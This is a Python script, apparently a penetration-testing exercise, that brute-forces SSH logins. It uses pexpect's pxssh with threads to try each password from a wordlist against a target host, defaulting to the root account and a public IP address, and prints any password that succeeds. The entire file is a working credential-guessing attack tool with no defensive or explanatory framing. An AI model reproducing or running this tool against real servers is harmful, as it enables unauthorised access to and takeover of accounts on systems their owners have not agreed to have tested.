from pexpect import pxssh
import argparse
import time
from threading import *

MAXCONNECTIONS = 5
STOP = False
THREADS = 0

connection_lock = BoundedSemaphore(value=MAXCONNECTIONS)

def connect(host, user, password, release):
    global STOP
    global THREADS
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password found: " + password)
        STOP = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            THREADS += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():

    import os.path

    parser = argparse.ArgumentParser(
        description=u'Threaded pxssh worm.'
    )

    parser.add_argument(
        u'-H',
        dest='target_host',
        default="8.8.8.8",
        help=u'The IP or DNS of the target.\nUsage: -H <target>'
    )

    parser.add_argument(
        u'-u',
        dest='username',
        default="root",
        help=u'The name of the username of which you are attempting to bruteforce'
    )

    parser.add_argument(
        u'-p',
        dest='password_file',
        default="passwords.txt",
        help=u'The PATH to the password list which you want to use.'
    )

    arguments = parser.parse_args()

    uname = arguments.username
    target = arguments.target_host
    passwords = os.path.isfile(arguments.password_file)

    if not passwords:
        parser.print_help()
        raise SystemExit

    with open(arguments.password_file) as f:
        for line in f:

            if STOP:
                print("[*] Exiting....")
                return

            if THREADS >= 5:
                print("[!] Exiting: " + \
                      "Too Many Connections Refused By Target System.")
                raise SystemExit

            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = Thread(target=connect, args=(target, uname, password, True))
            child = t.start()

    print("Password not found...")
    raise SystemExit

if __name__ == '__main__':
    main()